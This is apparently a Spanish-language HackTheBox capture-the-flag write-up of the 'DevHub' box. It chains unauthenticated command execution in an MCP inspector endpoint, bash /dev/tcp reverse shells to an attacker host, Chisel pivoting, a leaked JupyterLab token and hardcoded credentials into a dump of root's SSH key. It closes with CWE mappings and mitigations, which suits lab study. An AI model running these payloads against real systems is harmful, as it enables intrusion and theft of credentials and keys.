# DevHub — HackTheBox Writeup

> **SO:** Linux (Ubuntu)  
> **Stack:** nginx, MCPJam Inspector, JupyterLab, Python MCP server  
> **Técnicas:** RCE ciego en endpoint MCP, Chisel pivoting, credenciales hardcodeadas, SSH key dump  

---

## Cadena de ataque

```
MCPJam Inspector (puerto 6274)
        ↓
RCE ciego en /api/mcp/connect → reverse shell como mcp-dev
        ↓
Procesos internos → JupyterLab (8888) + opsmcp (5000)
        ↓
Chisel pivoting → acceso a servicios internos
        ↓
Token JupyterLab en procesos → shell como analyst
        ↓
/opt/opsmcp/server.py → API key hardcodeada
        ↓
ops._admin_dump → clave SSH privada de root
        ↓
SSH como root
```

---

## Reconocimiento

### Escaneo de puertos

```bash
nmap -sS --min-rate 5000 -p- -Pn -n --open $TARGET -oN silent
nmap -sVC -p 22,80,6274 $TARGET -oN service
```

**Puertos abiertos:**

| Puerto | Servicio | Detalle |
|--------|----------|---------|
| 22/tcp | SSH | OpenSSH 8.9p1 Ubuntu |
| 80/tcp | HTTP | nginx 1.18.0 — "DevHub - Internal Development Platform" |
| 6274/tcp | MCPJam Inspector | Servidor MCP para interacción con LLMs |

El puerto 6274 ejecuta un **MCPJam Inspector** — un servidor que expone herramientas ejecutables diseñadas para que modelos de lenguaje interactúen con el sistema. Sin autenticación ni restricciones de ejecución.

---

## Acceso inicial — RCE en MCPJam Inspector

### Identificación de la vulnerabilidad

El endpoint `POST /api/mcp/connect` acepta un campo `command` en el cuerpo JSON que se ejecuta directamente en el sistema sin validación ni autenticación:

```bash
curl -X POST http://$TARGET:6274/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{"serverConfig":{"command":"id","args":[],"env":{}},"serverId":"test"}'
```

**Respuesta:**
```json
{"success":false,"error":"Connection failed... MCP error -32000: Connection closed"}
```

El error confirma **RCE ciego** — el comando se ejecuta pero el proceso termina antes de devolver output.

### Reverse shell como mcp-dev

```bash
# Listener en Kali
nc -lvnp 4444

# Payload de reverse shell
curl -X POST http://$TARGET:6274/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{"serverConfig":{"command":"/bin/bash","args":["-c","bash -i >& /dev/tcp/LHOST/4444 0>&1"],"env":{}},"serverId":"revshell"}'
```

Shell obtenida como `mcp-dev` (uid=1001).

---

## Enumeración interna

```bash
id
# uid=1001(mcp-dev) gid=1001(mcp-dev) groups=1001(mcp-dev)

ps aux
# analyst  1026  ... jupyter-lab --ip=127.0.0.1 --port=8888
#                    --ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7
# root     1038  ... python3 /opt/opsmcp/server.py

ss -tulnp
# 127.0.0.1:5000  → opsmcp (corre como root)
# 127.0.0.1:8888  → JupyterLab (corre como analyst)
```

Dos servicios internos no expuestos: **JupyterLab** como `analyst` y **opsmcp** como `root`.

---

## Pivoting con Chisel

Para acceder a los servicios internos desde Kali:

```bash
# En Kali — servidor Chisel
./chisel server -p 9001 --reverse --socks5

# En la víctima — transferir y ejecutar
cd /tmp
wget http://10.10.14.92:8000/chiselE
chmod +x chisel

# Opción A — proxy SOCKS5
./chisel client 10.10.14.92:9001 R:socks &

# Opción B — port forward directo a JupyterLab
./chisel client 10.10.14.92:9001 R:8889:127.0.0.1:8888 &
```

Con la opción B, JupyterLab queda accesible en `http://localhost:8889` desde Kali directamente.

---

## Acceso a JupyterLab → Shell como analyst

El token de JupyterLab estaba expuesto en los argumentos del proceso, visible con `ps aux` sin privilegios:

```
--ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7
```

Accedemos a `http://localhost:8889/token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7`, abrimos la terminal integrada de JupyterLab y ejecutamos:

```bash
# Listener en Kali
nc -lvnp 5555

# En terminal JupyterLab
bash -i >& /dev/tcp/LHOST/5555 0>&1
```

Shell obtenida como `analyst`.

---

## Análisis del servicio opsmcp

```bash
cat /opt/opsmcp/server.py
```

**Hallazgos críticos:**

```python
# API key hardcodeada
VALID_API_KEY = "opsmcp_secret_key_4f5a6b7c8d9e0f1a"

# Herramienta oculta sin control de acceso
HIDDEN_TOOLS = {
    "ops._admin_dump": {
        "description": "Emergency credential dump - INTERNAL ONLY",
        "parameters": {"target": "string", "confirm": "boolean"}
    }
}
```

La función `_admin_dump` puede dumpear `ssh_keys`, `passwords` y `tokens` usando únicamente la API key como autenticación.

**Credenciales adicionales hardcodeadas:**

| Usuario | Contraseña |
|---------|------------|
| analyst | `JupyterN0tebook!2026` |
| mcp-dev | `Mcp!Insp3ct0r2026` |
| root    | `$6$rounds=656000$saltsalt$hashedpassword`
---

## Escalada de privilegios — Dump de clave SSH de root

### Paso 1 — Activar modo debug

```bash
curl -X POST http://localhost:5000/tools/call \
  -H "Content-Type: application/json" \
  -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" \
  -d '{"name":"ops._debug_mode","arguments":{}}'
```

### Paso 2 — Dump de clave SSH privada de root

```bash
curl -X POST http://localhost:5000/tools/call \
  -H "Content-Type: application/json" \
  -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" \
  -d '{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":true}}'
```

La respuesta devuelve la **clave privada SSH de root** completa.

### Paso 3 — SSH como root

```bash
vim id_rsa        # pegar la clave privada obtenida
chmod 600 id_rsa
ssh -i id_rsa root@$TARGET
cat /root/root.txt
```

---

## Resumen

| Fase | Técnica | Detalle |
|------|---------|---------|
| Foothold | RCE ciego en MCPJam Inspector | `command` sin autenticación en `/api/mcp/connect` |
| Pivoting | Chisel port forward | Acceso a JupyterLab (8888) y opsmcp (5000) |
| Lateral | Token JupyterLab expuesto en `ps aux` | Shell como `analyst` |
| Privesc | Credenciales hardcodeadas en `server.py` | API key → `ops._admin_dump` → clave SSH de root |
| Root | SSH con clave privada dumpeada | Acceso directo como root |

---

## Vulnerabilidades explotadas

| CWE | Descripción |
|-----|-------------|
| CWE-306 | Missing Authentication — `/api/mcp/connect` sin autenticación |
| CWE-78 | OS Command Injection — comandos sin sanitización |
| CWE-798 | Hard-coded Credentials — API key y passwords en código fuente |
| CWE-862 | Missing Authorization — `_admin_dump` sin control de acceso |
| CWE-214 | Sensitive Info en proceso — token expuesto en argumentos de `ps aux` |

---

## Mitigaciones

- Implementar autenticación en todos los endpoints expuestos
- Validar y sanitizar todo input — usar allowlists de comandos
- No hardcodear credenciales — usar variables de entorno o gestores de secretos
- Implementar RBAC y principio de mínimo privilegio
- No exponer tokens en argumentos de proceso — usar archivos de configuración con permisos restringidos
- No exponer funcionalidades de debug/dump en producción

---

## Referencias

- [Chisel — Fast TCP/UDP tunnel](https://github.com/jpillora/chisel)
- [MCPJam Inspector](https://github.com/MCPJam/inspector)
- [HackTricks — Linux Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)

## Related Notes

- [nmap](../../../tools/recon/nmap.md)
- [curl](../../../tools/web/curl.md)
- [netcat](../../../tools/pivot/netcat.md)
- [chisel](../../../tools/pivot/chisel.md)
- [mcp-api-injection](../../../exploits/web-rce/mcp-api-injection.md)
- [bash-tcp](../../../payloads/reverse-shells/bash-tcp.md)
